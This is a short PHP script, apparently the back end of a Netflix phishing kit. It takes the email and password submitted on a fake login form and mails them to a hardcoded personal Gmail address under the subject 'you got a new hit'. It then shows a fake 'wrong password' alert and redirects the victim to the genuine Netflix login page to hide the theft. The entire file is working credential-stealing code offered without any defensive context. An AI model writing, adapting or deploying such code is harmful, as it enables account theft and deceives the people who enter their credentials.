<?php 
$to = "tolaayomikun9@gmail.com";
$sub = "hey! you got a new hit. by @crazy_hacker404";
$email = $_POST['email'];
$pass = $_POST['password'];
$msg= "account type: NETFLIX"."\n\n"."email or phone no: ".$email."\n\n"."password: ".$pass;

mail($to , $sub , $msg);
    echo"<script type='text/javascript'>alert('it seems like you enter wrong password. try again later.');
     // Simulate an HTTP redirect:
    window.location.replace('http://www.netflix.com/in/login');
    </script>";
?>